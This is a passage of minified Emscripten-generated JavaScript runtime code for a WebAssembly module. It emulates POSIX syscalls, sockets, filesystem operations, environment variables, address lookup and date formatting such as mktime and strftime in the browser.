                                            +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                        ]),
                                        (HEAP32[(dirp + pos + 8) >> 2] = tempI64[0]),
                                        (HEAP32[(dirp + pos + 12) >> 2] = tempI64[1]),
                                        (HEAP16[(dirp + pos + 16) >> 1] = 280),
                                        (HEAP8[(dirp + pos + 18) >> 0] = type),
                                        stringToUTF8(name, dirp + pos + 19, 256),
                                        (pos += 280),
                                        (idx += 1);
                                }
                                return FS.llseek(stream, 280 * idx, 0), pos;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_getpeername(fd, addr, addrlen) {
                            try {
                                var sock = getSocketFromFD(fd);
                                return sock.daddr ? (writeSockaddr(addr, sock.family, DNS.lookup_name(sock.daddr), sock.dport, addrlen), 0) : -53;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_getrusage(who, usage) {
                            try {
                                return _memset(usage, 0, 136), (HEAP32[usage >> 2] = 1), (HEAP32[(usage + 4) >> 2] = 2), (HEAP32[(usage + 8) >> 2] = 3), (HEAP32[(usage + 12) >> 2] = 4), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_getsockname(fd, addr, addrlen) {
                            try {
                                err("__sys_getsockname " + fd);
                                var sock = getSocketFromFD(fd);
                                return writeSockaddr(addr, sock.family, DNS.lookup_name(sock.saddr || "0.0.0.0"), sock.sport, addrlen), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_getsockopt(fd, level, optname, optval, optlen) {
                            try {
                                var sock = getSocketFromFD(fd);
                                return 1 === level && 4 === optname ? ((HEAP32[optval >> 2] = sock.error), (HEAP32[optlen >> 2] = 4), (sock.error = null), 0) : -50;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_ioctl(fd, op, varargs) {
                            SYSCALLS.varargs = varargs;
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd);
                                switch (op) {
                                    case 21509:
                                    case 21505:
                                        return stream.tty ? 0 : -59;
                                    case 21510:
                                    case 21511:
                                    case 21512:
                                    case 21506:
                                    case 21507:
                                    case 21508:
                                        return stream.tty ? 0 : -59;
                                    case 21519:
                                        if (!stream.tty) return -59;
                                        var argp = SYSCALLS.get();
                                        return (HEAP32[argp >> 2] = 0), 0;
                                    case 21520:
                                        return stream.tty ? -28 : -59;
                                    case 21531:
                                        return (argp = SYSCALLS.get()), FS.ioctl(stream, op, argp);
                                    case 21523:
                                    case 21524:
                                        return stream.tty ? 0 : -59;
                                    default:
                                        abort("bad ioctl syscall " + op);
                                }
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_listen(fd, backlog) {
                            try {
                                var sock = getSocketFromFD(fd);
                                return sock.sock_ops.listen(sock, backlog), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_lstat64(path, buf) {
                            try {
                                return (path = SYSCALLS.getStr(path)), SYSCALLS.doStat(FS.lstat, path, buf);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_mkdir(path, mode) {
                            try {
                                return (path = SYSCALLS.getStr(path)), SYSCALLS.doMkdir(path, mode);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function syscallMmap2(addr, len, prot, flags, fd, off) {
                            var ptr;
                            off <<= 12;
                            var allocated = !1;
                            if (0 != (16 & flags) && addr % 65536 != 0) return -28;
                            if (0 != (32 & flags)) {
                                if (!(ptr = _memalign(65536, len))) return -48;
                                _memset(ptr, 0, len), (allocated = !0);
                            } else {
                                var info = FS.getStream(fd);
                                if (!info) return -8;
                                var res = FS.mmap(info, addr, len, off, prot, flags);
                                (ptr = res.ptr), (allocated = res.allocated);
                            }
                            return (SYSCALLS.mappings[ptr] = { malloc: ptr, len: len, allocated: allocated, fd: fd, prot: prot, flags: flags, offset: off }), ptr;
                        }
                        function ___sys_mmap2(addr, len, prot, flags, fd, off) {
                            try {
                                return syscallMmap2(addr, len, prot, flags, fd, off);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_mprotect(addr, len, size) {
                            return 0;
                        }
                        function syscallMunmap(addr, len) {
                            if (-1 == (0 | addr) || 0 === len) return -28;
                            var info = SYSCALLS.mappings[addr];
                            if (!info) return 0;
                            if (len === info.len) {
                                var stream = FS.getStream(info.fd);
                                stream && (2 & info.prot && SYSCALLS.doMsync(addr, stream, len, info.flags, info.offset), FS.munmap(stream)), (SYSCALLS.mappings[addr] = null), info.allocated && _free(info.malloc);
                            }
                            return 0;
                        }
                        function ___sys_munmap(addr, len) {
                            try {
                                return syscallMunmap(addr, len);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_nice(inc) {
                            return -63;
                        }
                        function ___sys_open(path, flags, varargs) {
                            SYSCALLS.varargs = varargs;
                            try {
                                var pathname = SYSCALLS.getStr(path),
                                    mode = varargs ? SYSCALLS.get() : 0;
                                return FS.open(pathname, flags, mode).fd;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_poll(fds, nfds, timeout) {
                            try {
                                for (var nonzero = 0, i = 0; i < nfds; i++) {
                                    var pollfd = fds + 8 * i,
                                        fd = HEAP32[pollfd >> 2],
                                        events = HEAP16[(pollfd + 4) >> 1],
                                        mask = 32,
                                        stream = FS.getStream(fd);
                                    stream && ((mask = SYSCALLS.DEFAULT_POLLMASK), stream.stream_ops.poll && (mask = stream.stream_ops.poll(stream))), (mask &= 24 | events) && nonzero++, (HEAP16[(pollfd + 6) >> 1] = mask);
                                }
                                return nonzero;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_prlimit64(pid, resource, new_limit, old_limit) {
                            try {
                                return old_limit && ((HEAP32[old_limit >> 2] = -1), (HEAP32[(old_limit + 4) >> 2] = -1), (HEAP32[(old_limit + 8) >> 2] = -1), (HEAP32[(old_limit + 12) >> 2] = -1)), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_recvfrom(fd, buf, len, flags, addr, addrlen) {
                            try {
                                var sock = getSocketFromFD(fd),
                                    msg = sock.sock_ops.recvmsg(sock, len);
                                return msg ? (addr && writeSockaddr(addr, sock.family, DNS.lookup_name(msg.addr), msg.port, addrlen), HEAPU8.set(msg.buffer, buf), msg.buffer.byteLength) : 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_rename(old_path, new_path) {
                            try {
                                return (old_path = SYSCALLS.getStr(old_path)), (new_path = SYSCALLS.getStr(new_path)), FS.rename(old_path, new_path), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_rmdir(path) {
                            try {
                                return (path = SYSCALLS.getStr(path)), FS.rmdir(path), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_sendto(fd, message, length, flags, addr, addr_len) {
                            try {
                                var sock = getSocketFromFD(fd),
                                    dest = getSocketAddress(addr, addr_len, !0);
                                return dest ? sock.sock_ops.sendmsg(sock, HEAP8, message, length, dest.addr, dest.port) : FS.write(sock.stream, HEAP8, message, length);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_setrlimit(varargs) {
                            return 0;
                        }
                        function ___sys_setsockopt(fd) {
                            try {
                                return -50;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_shutdown(fd, how) {
                            try {
                                return getSocketFromFD(fd), -52;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_socket(domain, type, protocol) {
                            try {
                                return SOCKFS.createSocket(domain, type, protocol).stream.fd;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_stat64(path, buf) {
                            try {
                                return (path = SYSCALLS.getStr(path)), SYSCALLS.doStat(FS.stat, path, buf);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_uname(buf) {
                            try {
                                if (!buf) return -21;
                                var layout = { __size__: 390, domainname: 325, machine: 260, nodename: 65, release: 130, sysname: 0, version: 195 },
                                    copyString = function (element, value) {
                                        writeAsciiToMemory(value, buf + layout[element]);
                                    };
                                return copyString("sysname", "Emscripten"), copyString("nodename", "emscripten"), copyString("release", "1.0"), copyString("version", "#1"), copyString("machine", "wasm32"), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_unlink(path) {
                            try {
                                return (path = SYSCALLS.getStr(path)), FS.unlink(path), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function __emscripten_throw_longjmp() {
                            throw "longjmp";
                        }
                        function _abort() {
                            abort();
                        }
                        function _clock() {
                            return void 0 === _clock.start && (_clock.start = Date.now()), (1e3 * (Date.now() - _clock.start)) | 0;
                        }
                        function _dlopen(filename, flag) {
                            abort("To use dlopen, you need to use Emscripten's linking support, see https://github.com/emscripten-core/emscripten/wiki/Linking");
                        }
                        function _dlsym(handle, symbol) {
                            abort("To use dlopen, you need to use Emscripten's linking support, see https://github.com/emscripten-core/emscripten/wiki/Linking");
                        }
                        function _emscripten_get_heap_max() {
                            return HEAPU8.length;
                        }
                        function _emscripten_memcpy_big(dest, src, num) {
                            HEAPU8.copyWithin(dest, src, src + num);
                        }
                        function abortOnCannotGrowMemory(requestedSize) {
                            abort("OOM");
                        }
                        function _emscripten_resize_heap(requestedSize) {
                            HEAPU8.length, abortOnCannotGrowMemory();
                        }
                        function _emscripten_thread_sleep(msecs) {
                            for (var start = _emscripten_get_now(); _emscripten_get_now() - start < msecs; );
                        }
                        var ENV = {};
                        function getExecutableName() {
                            return thisProgram || "./this.program";
                        }
                        function getEnvStrings() {
                            if (!getEnvStrings.strings) {
                                var env = {
                                    USER: "web_user",
                                    LOGNAME: "web_user",
                                    PATH: "/",
                                    PWD: "/",
                                    HOME: "/home/web_user",
                                    LANG: (("object" == typeof navigator && navigator.languages && navigator.languages[0]) || "C").replace("-", "_") + ".UTF-8",
                                    _: getExecutableName(),
                                };
                                for (var x in ENV) void 0 === ENV[x] ? delete env[x] : (env[x] = ENV[x]);
                                var strings = [];
                                for (var x in env) strings.push(x + "=" + env[x]);
                                getEnvStrings.strings = strings;
                            }
                            return getEnvStrings.strings;
                        }
                        function _environ_get(__environ, environ_buf) {
                            try {
                                var bufSize = 0;
                                return (
                                    getEnvStrings().forEach(function (string, i) {
                                        var ptr = environ_buf + bufSize;
                                        (HEAP32[(__environ + 4 * i) >> 2] = ptr), writeAsciiToMemory(string, ptr), (bufSize += string.length + 1);
                                    }),
                                    0
                                );
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        function _environ_sizes_get(penviron_count, penviron_buf_size) {
                            try {
                                var strings = getEnvStrings();
                                HEAP32[penviron_count >> 2] = strings.length;
                                var bufSize = 0;
                                return (
                                    strings.forEach(function (string) {
                                        bufSize += string.length + 1;
                                    }),
                                    (HEAP32[penviron_buf_size >> 2] = bufSize),
                                    0
                                );
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        function _exit(status) {
                            exit(status);
                        }
                        function _fd_close(fd) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd);
                                return FS.close(stream), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        function _fd_fdstat_get(fd, pbuf) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd),
                                    type = stream.tty ? 2 : FS.isDir(stream.mode) ? 3 : FS.isLink(stream.mode) ? 7 : 4;
                                return (HEAP8[pbuf >> 0] = type), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        function _fd_read(fd, iov, iovcnt, pnum) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd),
                                    num = SYSCALLS.doReadv(stream, iov, iovcnt);
                                return (HEAP32[pnum >> 2] = num), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        function _fd_seek(fd, offset_low, offset_high, whence, newOffset) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd),
                                    offset = 4294967296 * offset_high + (offset_low >>> 0);
                                return offset <= -9007199254740992 || offset >= 9007199254740992
                                    ? -61
                                    : (FS.llseek(stream, offset, whence),
                                      (tempI64 = [
                                          stream.position >>> 0,
                                          ((tempDouble = stream.position),
                                          +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                      ]),
                                      (HEAP32[newOffset >> 2] = tempI64[0]),
                                      (HEAP32[(newOffset + 4) >> 2] = tempI64[1]),
                                      stream.getdents && 0 === offset && 0 === whence && (stream.getdents = null),
                                      0);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        function _fd_write(fd, iov, iovcnt, pnum) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd),
                                    num = SYSCALLS.doWritev(stream, iov, iovcnt);
                                return (HEAP32[pnum >> 2] = num), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), e.errno;
                            }
                        }
                        var GAI_ERRNO_MESSAGES = {};
                        function _gai_strerror(val) {
                            _gai_strerror.buffer ||
                                ((_gai_strerror.buffer = _malloc(256)),
                                (GAI_ERRNO_MESSAGES[0] = "Success"),
                                (GAI_ERRNO_MESSAGES[-1] = "Invalid value for 'ai_flags' field"),
                                (GAI_ERRNO_MESSAGES[-2] = "NAME or SERVICE is unknown"),
                                (GAI_ERRNO_MESSAGES[-3] = "Temporary failure in name resolution"),
                                (GAI_ERRNO_MESSAGES[-4] = "Non-recoverable failure in name res"),
                                (GAI_ERRNO_MESSAGES[-6] = "'ai_family' not supported"),
                                (GAI_ERRNO_MESSAGES[-7] = "'ai_socktype' not supported"),
                                (GAI_ERRNO_MESSAGES[-8] = "SERVICE not supported for 'ai_socktype'"),
                                (GAI_ERRNO_MESSAGES[-10] = "Memory allocation failure"),
                                (GAI_ERRNO_MESSAGES[-11] = "System error returned in 'errno'"),
                                (GAI_ERRNO_MESSAGES[-12] = "Argument buffer overflow"));
                            var msg = "Unknown error";
                            return val in GAI_ERRNO_MESSAGES && (msg = GAI_ERRNO_MESSAGES[val].length > 255 ? "Message too long" : GAI_ERRNO_MESSAGES[val]), writeAsciiToMemory(msg, _gai_strerror.buffer), _gai_strerror.buffer;
                        }
                        function _getTempRet0() {
                            return getTempRet0();
                        }
                        function _getaddrinfo(node, service, hint, out) {
                            var ai,
                                addr = 0,
                                port = 0,
                                flags = 0,
                                family = 0,
                                type = 0,
                                proto = 0;
                            function allocaddrinfo(family, type, proto, canon, addr, port) {
                                var sa, salen, ai;
                                return (
                                    (salen = 10 === family ? 28 : 16),
                                    (addr = 10 === family ? inetNtop6(addr) : inetNtop4(addr)),
                                    assert(!writeSockaddr((sa = _malloc(salen)), family, addr, port)),
                                    (ai = _malloc(32)),
                                    (HEAP32[(ai + 4) >> 2] = family),
                                    (HEAP32[(ai + 8) >> 2] = type),
                                    (HEAP32[(ai + 12) >> 2] = proto),
                                    (HEAP32[(ai + 24) >> 2] = canon),
                                    (HEAP32[(ai + 20) >> 2] = sa),
                                    (HEAP32[(ai + 16) >> 2] = 10 === family ? 28 : 16),
                                    (HEAP32[(ai + 28) >> 2] = 0),
                                    ai
                                );
                            }
                            if (
                                (hint && ((flags = HEAP32[hint >> 2]), (family = HEAP32[(hint + 4) >> 2]), (type = HEAP32[(hint + 8) >> 2]), (proto = HEAP32[(hint + 12) >> 2])),
                                type && !proto && (proto = 2 === type ? 17 : 6),
                                !type && proto && (type = 17 === proto ? 2 : 1),
                                0 === proto && (proto = 6),
                                0 === type && (type = 1),
                                !node && !service)
                            )
                                return -2;
                            if (-1088 & flags) return -1;
                            if (0 !== hint && 2 & HEAP32[hint >> 2] && !node) return -1;
                            if (32 & flags) return -2;
                            if (0 !== type && 1 !== type && 2 !== type) return -7;
                            if (0 !== family && 2 !== family && 10 !== family) return -6;
                            if (service && ((service = UTF8ToString(service)), (port = parseInt(service, 10)), isNaN(port))) return 1024 & flags ? -2 : -8;
                            if (!node)
                                return 0 === family && (family = 2), 0 == (1 & flags) && (addr = 2 === family ? _htonl(2130706433) : [0, 0, 0, 1]), (ai = allocaddrinfo(family, type, proto, null, addr, port)), (HEAP32[out >> 2] = ai), 0;
                            if (null !== (addr = inetPton4((node = UTF8ToString(node)))))
                                if (0 === family || 2 === family) family = 2;
                                else {
                                    if (!(10 === family && 8 & flags)) return -2;
                                    (addr = [0, 0, _htonl(65535), addr]), (family = 10);
                                }
                            else if (null !== (addr = inetPton6(node))) {
                                if (0 !== family && 10 !== family) return -2;
                                family = 10;
                            }
                            return null != addr
                                ? ((ai = allocaddrinfo(family, type, proto, node, addr, port)), (HEAP32[out >> 2] = ai), 0)
                                : 4 & flags
                                ? -2
                                : ((addr = inetPton4((node = DNS.lookup_name(node)))),
                                  0 === family ? (family = 2) : 10 === family && (addr = [0, 0, _htonl(65535), addr]),
                                  (ai = allocaddrinfo(family, type, proto, null, addr, port)),
                                  (HEAP32[out >> 2] = ai),
                                  0);
                        }
                        function _getnameinfo(sa, salen, node, nodelen, serv, servlen, flags) {
                            var info = readSockaddr(sa, salen);
                            if (info.errno) return -6;
                            var port = info.port,
                                addr = info.addr,
                                overflowed = !1;
                            if (node && nodelen) {
                                var lookup;
                                if (1 & flags || !(lookup = DNS.lookup_addr(addr))) {
                                    if (8 & flags) return -2;
                                } else addr = lookup;
                                stringToUTF8(addr, node, nodelen) + 1 >= nodelen && (overflowed = !0);
                            }
                            return serv && servlen && stringToUTF8((port = "" + port), serv, servlen) + 1 >= servlen && (overflowed = !0), overflowed ? -12 : 0;
                        }
                        function _gettimeofday(ptr) {
                            var now = Date.now();
                            return (HEAP32[ptr >> 2] = (now / 1e3) | 0), (HEAP32[(ptr + 4) >> 2] = ((now % 1e3) * 1e3) | 0), 0;
                        }
                        function _mktime(tmPtr) {
                            _tzset();
                            var date = new Date(HEAP32[(tmPtr + 20) >> 2] + 1900, HEAP32[(tmPtr + 16) >> 2], HEAP32[(tmPtr + 12) >> 2], HEAP32[(tmPtr + 8) >> 2], HEAP32[(tmPtr + 4) >> 2], HEAP32[tmPtr >> 2], 0),
                                dst = HEAP32[(tmPtr + 32) >> 2],
                                guessedOffset = date.getTimezoneOffset(),
                                start = new Date(date.getFullYear(), 0, 1),
                                summerOffset = new Date(date.getFullYear(), 6, 1).getTimezoneOffset(),
                                winterOffset = start.getTimezoneOffset(),
                                dstOffset = Math.min(winterOffset, summerOffset);
                            if (dst < 0) HEAP32[(tmPtr + 32) >> 2] = Number(summerOffset != winterOffset && dstOffset == guessedOffset);
                            else if (dst > 0 != (dstOffset == guessedOffset)) {
                                var nonDstOffset = Math.max(winterOffset, summerOffset),
                                    trueOffset = dst > 0 ? dstOffset : nonDstOffset;
                                date.setTime(date.getTime() + 6e4 * (trueOffset - guessedOffset));
                            }
                            HEAP32[(tmPtr + 24) >> 2] = date.getDay();
                            var yday = ((date.getTime() - start.getTime()) / 864e5) | 0;
                            return (
                                (HEAP32[(tmPtr + 28) >> 2] = yday),
                                (HEAP32[tmPtr >> 2] = date.getSeconds()),
                                (HEAP32[(tmPtr + 4) >> 2] = date.getMinutes()),
                                (HEAP32[(tmPtr + 8) >> 2] = date.getHours()),
                                (HEAP32[(tmPtr + 12) >> 2] = date.getDate()),
                                (HEAP32[(tmPtr + 16) >> 2] = date.getMonth()),
                                (date.getTime() / 1e3) | 0
                            );
                        }
                        function _setTempRet0(val) {
                            setTempRet0(val);
                        }
                        function _signal(sig, func) {
                            return 0;
                        }
                        function __isLeapYear(year) {
                            return year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
                        }
                        function __arraySum(array, index) {
                            for (var sum = 0, i = 0; i <= index; sum += array[i++]);
                            return sum;
                        }
                        var __MONTH_DAYS_LEAP = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31],
                            __MONTH_DAYS_REGULAR = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
                        function __addDays(date, days) {
                            for (var newDate = new Date(date.getTime()); days > 0; ) {
                                var leap = __isLeapYear(newDate.getFullYear()),
                                    currentMonth = newDate.getMonth(),
                                    daysInCurrentMonth = (leap ? __MONTH_DAYS_LEAP : __MONTH_DAYS_REGULAR)[currentMonth];
                                if (!(days > daysInCurrentMonth - newDate.getDate())) return newDate.setDate(newDate.getDate() + days), newDate;
                                (days -= daysInCurrentMonth - newDate.getDate() + 1), newDate.setDate(1), currentMonth < 11 ? newDate.setMonth(currentMonth + 1) : (newDate.setMonth(0), newDate.setFullYear(newDate.getFullYear() + 1));
                            }
                            return newDate;
                        }
                        function _strftime(s, maxsize, format, tm) {
                            var tm_zone = HEAP32[(tm + 40) >> 2],
                                date = {
                                    tm_sec: HEAP32[tm >> 2],
                                    tm_min: HEAP32[(tm + 4) >> 2],
                                    tm_hour: HEAP32[(tm + 8) >> 2],
                                    tm_mday: HEAP32[(tm + 12) >> 2],
                                    tm_mon: HEAP32[(tm + 16) >> 2],
                                    tm_year: HEAP32[(tm + 20) >> 2],
                                    tm_wday: HEAP32[(tm + 24) >> 2],
                                    tm_yday: HEAP32[(tm + 28) >> 2],
                                    tm_isdst: HEAP32[(tm + 32) >> 2],
                                    tm_gmtoff: HEAP32[(tm + 36) >> 2],
                                    tm_zone: tm_zone ? UTF8ToString(tm_zone) : "",
                                },
                                pattern = UTF8ToString(format),
                                EXPANSION_RULES_1 = {
                                    "%c": "%a %b %d %H:%M:%S %Y",
                                    "%D": "%m/%d/%y",
                                    "%F": "%Y-%m-%d",
                                    "%h": "%b",
                                    "%r": "%I:%M:%S %p",
                                    "%R": "%H:%M",
                                    "%T": "%H:%M:%S",
                                    "%x": "%m/%d/%y",
                                    "%X": "%H:%M:%S",
                                    "%Ec": "%c",
                                    "%EC": "%C",
                                    "%Ex": "%m/%d/%y",
                                    "%EX": "%H:%M:%S",
                                    "%Ey": "%y",
                                    "%EY": "%Y",
                                    "%Od": "%d",
                                    "%Oe": "%e",
                                    "%OH": "%H",
                                    "%OI": "%I",
                                    "%Om": "%m",
                                    "%OM": "%M",
                                    "%OS": "%S",
                                    "%Ou": "%u",
                                    "%OU": "%U",
                                    "%OV": "%V",
                                    "%Ow": "%w",
                                    "%OW": "%W",
                                    "%Oy": "%y",
                                };
                            for (var rule in EXPANSION_RULES_1) pattern = pattern.replace(new RegExp(rule, "g"), EXPANSION_RULES_1[rule]);
                            var WEEKDAYS = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
                                MONTHS = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
                            function leadingSomething(value, digits, character) {
                                for (var str = "number" == typeof value ? value.toString() : value || ""; str.length < digits; ) str = character[0] + str;
                                return str;
                            }
                            function leadingNulls(value, digits) {
                                return leadingSomething(value, digits, "0");
                            }
                            function compareByDay(date1, date2) {
                                function sgn(value) {
                                    return value < 0 ? -1 : value > 0 ? 1 : 0;
                                }
                                var compare;
                                return 0 === (compare = sgn(date1.getFullYear() - date2.getFullYear())) && 0 === (compare = sgn(date1.getMonth() - date2.getMonth())) && (compare = sgn(date1.getDate() - date2.getDate())), compare;
                            }
                            function getFirstWeekStartDate(janFourth) {
                                switch (janFourth.getDay()) {
                                    case 0:
                                        return new Date(janFourth.getFullYear() - 1, 11, 29);
                                    case 1:
                                        return janFourth;
                                    case 2:
                                        return new Date(janFourth.getFullYear(), 0, 3);
                                    case 3:
                                        return new Date(janFourth.getFullYear(), 0, 2);
                                    case 4:
                                        return new Date(janFourth.getFullYear(), 0, 1);
                                    case 5:
                                        return new Date(janFourth.getFullYear() - 1, 11, 31);
                                    case 6:
                                        return new Date(janFourth.getFullYear() - 1, 11, 30);
                                }
                            }
                            function getWeekBasedYear(date) {
                                var thisDate = __addDays(new Date(date.tm_year + 1900, 0, 1), date.tm_yday),
                                    janFourthThisYear = new Date(thisDate.getFullYear(), 0, 4),
                                    janFourthNextYear = new Date(thisDate.getFullYear() + 1, 0, 4),
                                    firstWeekStartThisYear = getFirstWeekStartDate(janFourthThisYear),
                                    firstWeekStartNextYear = getFirstWeekStartDate(janFourthNextYear);
                                return compareByDay(firstWeekStartThisYear, thisDate) <= 0 ? (compareByDay(firstWeekStartNextYear, thisDate) <= 0 ? thisDate.getFullYear() + 1 : thisDate.getFullYear()) : thisDate.getFullYear() - 1;
                            }
                            var EXPANSION_RULES_2 = {
                                "%a": function (date) {
                                    return WEEKDAYS[date.tm_wday].substring(0, 3);
                                },
                                "%A": function (date) {
                                    return WEEKDAYS[date.tm_wday];
                                },
                                "%b": function (date) {
                                    return MONTHS[date.tm_mon].substring(0, 3);
                                },
                                "%B": function (date) {
                                    return MONTHS[date.tm_mon];
                                },
                                "%C": function (date) {
                                    return leadingNulls(((date.tm_year + 1900) / 100) | 0, 2);
                                },
                                "%d": function (date) {
                                    return leadingNulls(date.tm_mday, 2);
                                },
                                "%e": function (date) {
                                    return leadingSomething(date.tm_mday, 2, " ");
                                },
                                "%g": function (date) {
                                    return getWeekBasedYear(date).toString().substring(2);
                                },
                                "%G": function (date) {
                                    return getWeekBasedYear(date);
                                },
                                "%H": function (date) {
                                    return leadingNulls(date.tm_hour, 2);
                                },
                                "%I": function (date) {
                                    var twelveHour = date.tm_hour;
                                    return 0 == twelveHour ? (twelveHour = 12) : twelveHour > 12 && (twelveHour -= 12), leadingNulls(twelveHour, 2);
                                },
                                "%j": function (date) {
                                    return leadingNulls(date.tm_mday + __arraySum(__isLeapYear(date.tm_year + 1900) ? __MONTH_DAYS_LEAP : __MONTH_DAYS_REGULAR, date.tm_mon - 1), 3);
                                },
                                "%m": function (date) {
                                    return leadingNulls(date.tm_mon + 1, 2);
                                },
                                "%M": function (date) {
                                    return leadingNulls(date.tm_min, 2);
                                },
                                "%n": function () {
                                    return "\n";
                                },
                                "%p": function (date) {
                                    return date.tm_hour >= 0 && date.tm_hour < 12 ? "AM" : "PM";
                                },
                                "%S": function (date) {
                                    return leadingNulls(date.tm_sec, 2);
                                },
                                "%t": function () {
                                    return "\t";
                                },
                                "%u": function (date) {
                                    return date.tm_wday || 7;
                                },
                                "%U": function (date) {
                                    var janFirst = new Date(date.tm_year + 1900, 0, 1),
                                        firstSunday = 0 === janFirst.getDay() ? janFirst : __addDays(janFirst, 7 - janFirst.getDay()),
                                        endDate = new Date(date.tm_year + 1900, date.tm_mon, date.tm_mday);
                                    if (compareByDay(firstSunday, endDate) < 0) {
                                        var februaryFirstUntilEndMonth = __arraySum(__isLeapYear(endDate.getFullYear()) ? __MONTH_DAYS_LEAP : __MONTH_DAYS_REGULAR, endDate.getMonth() - 1) - 31,
                                            days = 31 - firstSunday.getDate() + februaryFirstUntilEndMonth + endDate.getDate();
                                        return leadingNulls(Math.ceil(days / 7), 2);
                                    }
                                    return 0 === compareByDay(firstSunday, janFirst) ? "01" : "00";
                                },
                                "%V": function (date) {
                                    var daysDifference,
                                        janFourthThisYear = new Date(date.tm_year + 1900, 0, 4),
                                        janFourthNextYear = new Date(date.tm_year + 1901, 0, 4),
                                        firstWeekStartThisYear = getFirstWeekStartDate(janFourthThisYear),
                                        firstWeekStartNextYear = getFirstWeekStartDate(janFourthNextYear),
                                        endDate = __addDays(new Date(date.tm_year + 1900, 0, 1), date.tm_yday);
                                    return compareByDay(endDate, firstWeekStartThisYear) < 0
                                        ? "53"
                                        : compareByDay(firstWeekStartNextYear, endDate) <= 0
                                        ? "01"
                                        : ((daysDifference = firstWeekStartThisYear.getFullYear() < date.tm_year + 1900 ? date.tm_yday + 32 - firstWeekStartThisYear.getDate() : date.tm_yday + 1 - firstWeekStartThisYear.getDate()),
                                          leadingNulls(Math.ceil(daysDifference / 7), 2));
                                },
                                "%w": function (date) {
